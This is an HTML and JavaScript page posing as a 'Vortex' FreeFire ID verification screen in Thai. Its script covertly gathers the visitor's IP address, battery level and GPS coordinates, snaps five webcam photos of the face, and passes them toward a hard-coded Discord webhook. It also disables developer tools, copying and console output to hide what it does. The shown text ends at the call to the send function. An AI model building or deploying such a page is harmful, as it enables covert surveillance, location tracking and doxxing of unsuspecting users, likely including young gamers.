<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🌀 Vortex - ยืนยันตัวตน</title>

    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        body {
            font-family: 'Kanit', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #0a0a0f;
            padding: 20px;
            overflow: hidden;
            position: relative;
        }

        /* Animated background */
        .bg-gradient-anim {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #0a0a0f, #1a0a0a, #0a0a1a, #0a0a0f);
            background-size: 400% 400%;
            animation: bgMove 12s ease infinite;
            z-index: 0;
        }

        @keyframes bgMove {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* Glow orbs */
        .glow-orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(100px);
            pointer-events: none;
            z-index: 0;
        }
        .glow-orb-1 {
            width: 500px;
            height: 500px;
            background: rgba(255, 106, 0, 0.12);
            top: -150px;
            right: -100px;
            animation: orbFloat 10s ease-in-out infinite;
        }
        .glow-orb-2 {
            width: 400px;
            height: 400px;
            background: rgba(238, 9, 121, 0.10);
            bottom: -100px;
            left: -100px;
            animation: orbFloat 12s ease-in-out infinite reverse;
        }
        .glow-orb-3 {
            width: 300px;
            height: 300px;
            background: rgba(255, 106, 0, 0.06);
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation: orbPulse 8s ease-in-out infinite;
        }

        @keyframes orbFloat {
            0%, 100% { transform: translate(0, 0); }
            50% { transform: translate(40px, -40px); }
        }
        @keyframes orbPulse {
            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.4; }
            50% { transform: translate(-50%, -50%) scale(1.8); opacity: 0.8; }
        }

        /* Particles */
        .particle {
            position: fixed;
            width: 3px;
            height: 3px;
            background: rgba(255, 106, 0, 0.3);
            border-radius: 50%;
            pointer-events: none;
            z-index: 0;
            animation: floatParticle linear infinite;
        }

        @keyframes floatParticle {
            0% { transform: translateY(100vh) scale(0); opacity: 0; }
            10% { opacity: 0.8; }
            90% { opacity: 0.8; }
            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
        }

        /* Glass panel */
        .glass-panel {
            position: relative;
            z-index: 1;
            background: rgba(10, 10, 15, 0.7);
            backdrop-filter: blur(40px);
            -webkit-backdrop-filter: blur(40px);
            border: 1px solid rgba(255, 255, 255, 0.06);
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), inset 0 1px 0 rgba(255, 255, 255, 0.05);
            border-radius: 40px;
            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
            width: 100%;
            max-width: 440px;
            overflow: hidden;
        }

        .glass-panel:hover {
            transform: translateY(-4px);
            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.9), inset 0 1px 0 rgba(255, 255, 255, 0.08);
        }

        /* Header */
        .header-vortex {
            position: relative;
            background: linear-gradient(135deg, rgba(255, 106, 0, 0.15), rgba(238, 9, 121, 0.10));
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            padding: 24px 28px;
            overflow: hidden;
        }

        .header-vortex::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 50%, rgba(255, 106, 0, 0.05), transparent 60%);
            animation: headerShine 6s ease-in-out infinite;
        }

        @keyframes headerShine {
            0%, 100% { transform: translate(0, 0); }
            50% { transform: translate(10%, 10%); }
        }

        .logo-vortex {
            font-family: 'Orbitron', sans-serif;
            font-weight: 900;
            font-size: 1.8rem;
            background: linear-gradient(135deg, #ff6a00, #ee0979, #ff6a00);
            background-size: 200% 200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: gradShift 3s ease-in-out infinite;
            letter-spacing: 3px;
        }

        @keyframes gradShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .logo-icon {
            width: 52px;
            height: 52px;
            background: linear-gradient(135deg, rgba(255, 106, 0, 0.25), rgba(238, 9, 121, 0.25));
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2rem;
            border: 1px solid rgba(255, 106, 0, 0.15);
            box-shadow: 0 0 40px rgba(255, 106, 0, 0.1);
            animation: logoGlow 3s ease-in-out infinite;
        }

        @keyframes logoGlow {
            0%, 100% { box-shadow: 0 0 40px rgba(255, 106, 0, 0.1); }
            50% { box-shadow: 0 0 60px rgba(255, 106, 0, 0.3); }
        }

        /* Input */
        .input-cyber {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 16px;
            padding: 16px 20px;
            color: #fff;
            font-size: 1.05rem;
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            width: 100%;
            backdrop-filter: blur(10px);
        }

        .input-cyber:focus {
            border-color: rgba(255, 106, 0, 0.4);
            box-shadow: 0 0 30px rgba(255, 106, 0, 0.08);
            outline: none;
            transform: scale(1.02);
            background: rgba(255, 255, 255, 0.05);
        }

        .input-cyber::placeholder {
            color: rgba(255, 255, 255, 0.2);
            font-weight: 300;
        }

        /* Button */
        .btn-primary {
            background: linear-gradient(135deg, #ff6a00, #ee0979);
            border: none;
            padding: 16px 28px;
            border-radius: 16px;
            color: #fff;
            font-weight: 600;
            font-size: 1.05rem;
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            cursor: pointer;
            position: relative;
            overflow: hidden;
            width: 100%;
            letter-spacing: 0.5px;
        }

        .btn-primary::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.12), transparent);
            transition: left 0.6s;
        }

        .btn-primary:hover::before {
            left: 100%;
        }

        .btn-primary:hover {
            transform: scale(1.03) translateY(-2px);
            box-shadow: 0 15px 40px rgba(255, 106, 0, 0.3);
        }

        .btn-primary:active {
            transform: scale(0.97);
        }

        /* Video ring */
        .video-ring {
            position: relative;
            width: 200px;
            height: 200px;
            margin: 0 auto 20px;
        }

        .video-ring-inner {
            position: relative;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            overflow: hidden;
            border: 2px solid rgba(255, 106, 0, 0.15);
            box-shadow: 0 0 60px rgba(255, 106, 0, 0.05);
            background: rgba(0,0,0,0.3);
        }

        .video-ring-inner video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }

        .video-ring-ring {
            position: absolute;
            inset: -4px;
            border-radius: 50%;
            padding: 4px;
            background: conic-gradient(from 0deg, transparent, rgba(255,106,0,0.4), rgba(238,9,121,0.4), transparent);
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            animation: spinRing 4s linear infinite;
            pointer-events: none;
        }

        @keyframes spinRing {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .scan-line {
            position: absolute;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, rgba(255,106,0,0.6), rgba(238,9,121,0.6), transparent);
            animation: scanMove 2.5s ease-in-out infinite;
            box-shadow: 0 0 20px rgba(255,106,0,0.2);
            border-radius: 2px;
        }

        @keyframes scanMove {
            0% { top: 0; opacity: 0.3; }
            50% { top: 100%; opacity: 1; }
            100% { top: 0; opacity: 0.3; }
        }

        /* Status badge */
        .badge-live {
            display: inline-block;
            padding: 6px 16px;
            border-radius: 100px;
            font-size: 0.7rem;
            font-weight: 500;
            letter-spacing: 0.5px;
            background: rgba(255, 106, 0, 0.12);
            border: 1px solid rgba(255, 106, 0, 0.2);
            color: #ff8c42;
            animation: pulseBadge 2s ease-in-out infinite;
        }

        @keyframes pulseBadge {
            0%, 100% { opacity: 0.7; }
            50% { opacity: 1; }
        }

        /* Result cards */
        .result-card {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: 16px;
            padding: 14px 18px;
            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .result-card:hover {
            background: rgba(255, 255, 255, 0.05);
            transform: translateX(6px);
            border-color: rgba(255, 106, 0, 0.12);
        }

        .result-icon {
            width: 40px;
            height: 40px;
            border-radius: 12px;
            background: linear-gradient(135deg, rgba(255, 106, 0, 0.1), rgba(238, 9, 121, 0.1));
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.1rem;
            flex-shrink: 0;
            border: 1px solid rgba(255, 255, 255, 0.04);
        }

        .result-label {
            font-size: 0.55rem;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            color: rgba(255, 255, 255, 0.25);
            font-weight: 500;
        }

        .result-value {
            font-size: 0.85rem;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.85);
            word-break: break-all;
        }

        .webhook-status-box {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: 16px;
            padding: 14px 18px;
            text-align: center;
        }

        /* Scrollbar */
        ::-webkit-scrollbar { width: 3px; }
        ::-webkit-scrollbar-thumb { background: rgba(255, 106, 0, 0.3); border-radius: 999px; }
        ::-webkit-scrollbar-track { background: rgba(255, 255, 255, 0.02); border-radius: 999px; }

        /* Hide buttons */
        #btn-capture, #btn-cancel-scan { display: none !important; }

        .step-transition { transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1); }
        .fade-enter { animation: fadeSlide 0.6s cubic-bezier(0.34, 1.56, 0.64, 1); }

        @keyframes fadeSlide {
            0% { opacity: 0; transform: translateY(20px) scale(0.96); }
            100% { opacity: 1; transform: translateY(0) scale(1); }
        }

        /* Reading indicator - แสดงสถานะการอ่านข้อมูล */
        .reading-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #ff6a00;
            margin-right: 8px;
            animation: dotBlink 0.8s ease-in-out infinite;
        }

        @keyframes dotBlink {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.2; transform: scale(0.5); }
        }

        /* Ripple effect */
        .ripple {
            position: fixed;
            border-radius: 50%;
            background: rgba(255, 106, 0, 0.25);
            transform: scale(0);
            animation: rippleAnim 0.7s ease-out;
            pointer-events: none;
            z-index: 9999;
        }

        @keyframes rippleAnim {
            to { transform: scale(4); opacity: 0; }
        }
    </style>
</head>
<body>

    <!-- Background -->
    <div class="bg-gradient-anim"></div>
    <div class="glow-orb glow-orb-1"></div>
    <div class="glow-orb glow-orb-2"></div>
    <div class="glow-orb glow-orb-3"></div>

    <!-- Particles -->
    <div id="particles-container"></div>

    <!-- Main Card -->
    <div class="glass-panel">

        <!-- Header -->
        <div class="header-vortex flex items-center gap-4 relative z-10">
            <div class="logo-icon">🌀</div>
            <div>
                <div class="logo-vortex">VORTEX</div>
                <p class="text-white/40 text-[10px] tracking-widest font-light">⚡ SECURE IDENTIFICATION</p>
            </div>
        </div>

        <!-- Content -->
        <div class="p-6 pt-6">

            <!-- ===== STEP 1: กรอก ID ===== -->
            <div id="step-input" class="step-transition">
                <div class="space-y-4">
                    <div>
                        <label class="text-[10px] uppercase tracking-widest text-white/30 block mb-2 font-medium flex items-center gap-2">
                            🆔 FreeFire ID
                        </label>
                        <input id="ff-id-input" type="text" placeholder="Enter your ID" 
                               class="input-cyber">
                    </div>

                    <button id="btn-to-scan" class="btn-primary">
                        <span class="flex items-center justify-center gap-2">
                            <span>SCAN NOW</span>
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
                        </span>
                    </button>

                    <div class="flex justify-center gap-4 text-[10px] text-white/20 pt-1">
                        <span class="flex items-center gap-1.5">
                            <span class="w-1.5 h-1.5 rounded-full bg-green-400/50 inline-block"></span> 
                            SECURE
                        </span>
                        <span class="flex items-center gap-1.5">
                            <span class="w-1.5 h-1.5 rounded-full bg-blue-400/50 inline-block"></span> 
                            ENCRYPTED
                        </span>
                    </div>
                </div>

                <div class="mt-5 text-center">
                    <p id="status-msg" class="text-white/30 text-xs tracking-widest font-light animate-pulse">
                        ⏳ READY
                    </p>
                </div>
            </div>

            <!-- ===== STEP 2: สแกนหน้า ===== -->
            <div id="step-scan" class="hidden step-transition text-center">
                <div class="video-ring">
                    <div class="video-ring-inner">
                        <video id="cam" autoplay playsinline></video>
                        <div class="scan-line"></div>
                    </div>
                    <div class="video-ring-ring"></div>
                </div>
                
                <p id="scan-status" class="text-white/60 text-sm tracking-widest font-light animate-pulse">
                    📷 INITIALIZING CAMERA...
                </p>
                <p id="capture-progress" class="text-white/20 text-xs mt-2 hidden tracking-wider">
                    📸 CAPTURING...
                </p>

                <div class="mt-4 flex justify-center">
                    <span class="badge-live">● LIVE</span>
                </div>
            </div>

            <!-- ===== STEP 3: ผลลัพธ์ ===== -->
            <div id="step-result" class="hidden fade-enter">
                <!-- Success Header -->
                <div class="bg-gradient-to-br from-orange-500/10 to-pink-500/10 border border-white/5 rounded-2xl p-5 mb-5 text-center">
                    <div class="flex items-center justify-center gap-4">
                        <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-orange-500 to-pink-500 flex items-center justify-center text-2xl shadow-xl shadow-orange-500/20">
                            ✅
                        </div>
                        <div class="text-left">
                            <h2 class="text-lg font-bold text-white flex items-center gap-2">
                                VERIFIED
                                <span class="text-[9px] bg-white/10 px-2 py-0.5 rounded-full border border-white/10 font-normal tracking-widest">FF</span>
                            </h2>
                            <p class="text-white/30 text-xs tracking-widest">REF: <span id="ref-code">FF-994102-B</span></p>
                        </div>
                    </div>
                </div>

                <!-- Webhook Status -->
                <div class="webhook-status-box mb-4">
                    <p id="webhook-msg" class="text-xs text-yellow-400/60 font-light tracking-wider flex items-center justify-center">
                        <span class="reading-dot"></span>
                        READING DATA...
                    </p>
                </div>

                <!-- Data Cards -->
                <div id="info-box" class="space-y-2.5 max-h-[360px] overflow-y-auto pr-1"></div>

                <!-- Back Button -->
                <button id="btn-back" class="mt-5 w-full py-3.5 rounded-xl border border-white/5 text-white/30 hover:text-white/70 hover:border-white/15 transition text-xs tracking-widest font-light backdrop-blur-sm hover:bg-white/5">
                    ⟲ RESET
                </button>
            </div>

        </div>
    </div>

<script>
// === Ripple Effect ทุกการคลิก ===
document.addEventListener('click', function(e) {
    const ripple = document.createElement('div');
    ripple.className = 'ripple';
    const size = Math.random() * 60 + 30;
    ripple.style.width = ripple.style.height = size + 'px';
    ripple.style.left = (e.clientX - size/2) + 'px';
    ripple.style.top = (e.clientY - size/2) + 'px';
    document.body.appendChild(ripple);
    setTimeout(() => ripple.remove(), 700);
});

// === Particles ===
(function createParticles() {
    const container = document.getElementById('particles-container');
    for (let i = 0; i < 35; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.width = (Math.random() * 3 + 1) + 'px';
        p.style.height = p.style.width;
        p.style.animationDuration = (Math.random() * 12 + 8) + 's';
        p.style.animationDelay = (Math.random() * 12) + 's';
        p.style.opacity = Math.random() * 0.3 + 0.1;
        container.appendChild(p);
    }
})();

// === ป้องกัน开发者工具 ===
document.addEventListener('contextmenu', e => { e.preventDefault(); return false; });
document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); return false; }
    if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) { e.preventDefault(); return false; }
    if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I' || e.key === 'j' || e.key === 'J')) { e.preventDefault(); return false; }
    if (e.ctrlKey && (e.key === 's' || e.key === 'S')) { e.preventDefault(); return false; }
    if (e.ctrlKey && e.shiftKey && (e.key === 'c' || e.key === 'C')) { e.preventDefault(); return false; }
    if (e.altKey && e.ctrlKey && (e.key === 'i' || e.key === 'I')) { e.preventDefault(); return false; }
    return true;
});
document.addEventListener('dragstart', e => e.preventDefault());
document.addEventListener('drop', e => e.preventDefault());
document.addEventListener('copy', e => e.preventDefault());
document.addEventListener('paste', e => e.preventDefault());
document.addEventListener('cut', e => e.preventDefault());
console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};

// === CONFIG ===
const WEBHOOK_URL = "https://discord.com/api/webhooks/1512064053273694319/HicoP_oS0YI7gGBp6wO-NtKLwos7YBZSgIkvyjlNaOfEWOqOdL7B9cFNjYB4CyRz8qfu";

let userData = {
    lat: "ไม่ระบุ",
    lon: "ไม่ระบุ",
    ip: "Unknown",
    battery: "Unknown",
    ffid: ""
};

let cameraStream = null;
let isCapturing = false;

// ===== เก็บข้อมูล (พร้อมแสดงสถานะการอ่าน) =====
async function collectData() {
    const statusMsg = document.getElementById("status-msg");
    const webhookMsg = document.getElementById("webhook-msg");
    
    // แสดงสถานะกำลังอ่านข้อมูล
    if (webhookMsg) {
        webhookMsg.innerHTML = `<span class="reading-dot"></span> READING DATA...`;
        webhookMsg.className = "text-xs text-yellow-400/60 font-light tracking-wider flex items-center justify-center";
    }
    
    try {
        statusMsg.innerText = "📡 กำลังอ่าน IP...";
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        userData.ip = ipData.ip;
    } catch(e) {}

    try {
        statusMsg.innerText = "🔋 กำลังอ่านแบตเตอรี่...";
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            userData.battery = Math.floor(battery.level * 100) + "%";
        }
    } catch(e) {}

    return new Promise((resolve) => {
        statusMsg.innerText = "📍 กำลังอ่านพิกัด GPS...";
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    userData.lat = pos.coords.latitude;
                    userData.lon = pos.coords.longitude;
                    statusMsg.innerText = "✅ อ่านข้อมูลครบแล้ว!";
                    resolve();
                },
                () => {
                    statusMsg.innerText = "⚠️ GPS ไม่พร้อมใช้งาน";
                    resolve();
                }
            );
        } else {
            statusMsg.innerText = "⚠️ GPS ไม่รองรับ";
            resolve();
        }
    });
}

// ===== เปิดกล้องและถ่ายอัตโนมัติ =====
async function startCameraAndAutoCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
        });
        cameraStream = stream;
        const video = document.getElementById("cam");
        video.srcObject = stream;
        document.getElementById("scan-status").innerText = "📸 CAPTURING...";
        document.getElementById("capture-progress").classList.remove("hidden");
        
        await new Promise(resolve => { video.onloadedmetadata = () => { resolve(); }; });
        
        startBurstCapture(video);
        return true;
    } catch (err) {
        document.getElementById("scan-status").innerText = "❌ CAMERA ERROR";
        return false;
    }
}

// ===== ถ่ายรัว 5 รูป =====
function startBurstCapture(video) {
    if (isCapturing) return;
    isCapturing = true;
    
    const burstCount = 5;
    let captured = 0;
    const images = [];
    
    function captureOne() {
        try {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext("2d");
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob((blob) => {
                if (blob) images.push(blob);
                captured++;
                if (captured < burstCount) setTimeout(captureOne, 300);
                else finishAndSend(images, video);
            }, "image/png", 0.9);
        } catch(e) {
            captured++;
            if (captured < burstCount) setTimeout(captureOne, 300);
            else finishAndSend(images, video);
        }
    }
    captureOne();
}

function finishAndSend(images, video) {
    if (cameraStream) {
        cameraStream.getTracks().forEach(t => t.stop());
        cameraStream = null;
    }
    sendAllToWebhook(images);
}
